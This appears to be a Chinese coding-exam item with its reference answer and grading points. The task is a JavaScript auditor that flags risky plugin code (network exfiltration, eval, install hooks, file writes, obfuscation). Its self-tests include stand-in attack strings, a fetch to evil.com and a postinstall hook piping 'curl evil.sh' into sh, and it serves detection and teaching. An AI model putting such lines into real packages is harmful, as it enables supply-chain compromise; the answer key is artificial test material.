## RBL-911：笔试：手写插件供应链审计器（规则 + 分级）

**答**：实现 `auditPlugin(code, opts)`。内置规则：1) 'net-exfil'：`fetch('http...` 或 `XMLHttpRequest` → high（opts.allowNet=true 豁免）；2) 'eval'：eval(/new Function → high；3) 'obfuscation'：`_0x` 前缀标识符出现 ≥5 次 → medium；4) 'fs-write'：fs.writeFile/writeFileSync → medium；5) 'install-script'：postinstall/preinstall 字样 → high。裁决：任一 high → 'reject'；有 medium → 'review'；干净 → 'pass'。返回 `{ findings: Array<{ rule, severity, count }>, verdict }`（findings 按 rule 聚合计数，按 severity 降序）。边界：空代码；allowNet 豁免生效。

```javascript
const RULES = [
  { id: 'net-exfil', re: /fetch\s*\(\s*['"]https?:\/\/|XMLHttpRequest/g, severity: 'high', opt: 'allowNet' },
  { id: 'eval', re: /\beval\s*\(|new\s+Function\s*\(/g, severity: 'high' },
  { id: 'install-script', re: /postinstall|preinstall/g, severity: 'high' },
  { id: 'fs-write', re: /fs\.(?:writeFile|writeFileSync)/g, severity: 'medium' },
];

function auditPlugin(code = '', opts = {}) {
  const findings = [];
  for (const r of RULES) {
    if (r.opt && opts[r.opt]) continue;                  // 豁免
    const count = [...code.matchAll(r.re)].length;
    if (count) findings.push({ rule: r.id, severity: r.severity, count });
  }
  // 混淆检测：_0x 标识符计数
  const obf = [...code.matchAll(/_0x[a-f0-9]+/g)].length;
  if (obf >= 5) findings.push({ rule: 'obfuscation', severity: 'medium', count: obf });

  findings.sort((a, b) => (a.severity === 'high' ? -1 : 1) - (b.severity === 'high' ? -1 : 1));
  const high = findings.some(f => f.severity === 'high');
  const verdict = high ? 'reject' : findings.length ? 'review' : 'pass';
  return { findings, verdict };
}

// 自测
let r = auditPlugin('const x = 1; export default x;');
console.log(r.verdict === 'pass' && r.findings.length === 0);

r = auditPlugin("fetch('https://evil.com/x', {data}); eval(payload);");
console.log(r.verdict === 'reject');
console.log(r.findings.filter(f => f.severity === 'high').length === 2);

// allowNet 豁免
r = auditPlugin("fetch('https://api.x.com')", { allowNet: true });
console.log(r.verdict === 'pass');

// 混淆
r = auditPlugin('var _0x1a=1;var _0x2b=2;var _0x3c=3;var _0x4d=4;var _0x5e=5;');
console.log(r.findings.find(f => f.rule === 'obfuscation').count === 5);
console.log(r.verdict === 'review');                     // 仅 medium

// install-script
r = auditPlugin('scripts: { postinstall: "curl evil.sh | sh" }');
console.log(r.verdict === 'reject' && r.findings[0].rule === 'install-script');
console.log(auditPlugin('').verdict === 'pass');
```

**评分点**：
- 规则数据化（正则+严重度+豁免选项）可扩展；计数聚合按 rule 输出
- 混淆检测用计数阈值（≥5）降低误报；裁决三级（high 拒/medium 审/干净过）
- allowNet 豁免实现（opts 驱动）；排序 high 优先；边界
- 能说清「postinstall 是供应链第一向量（用户权限任意执行、review 之外）——隐式信任变显式声明」属于加分
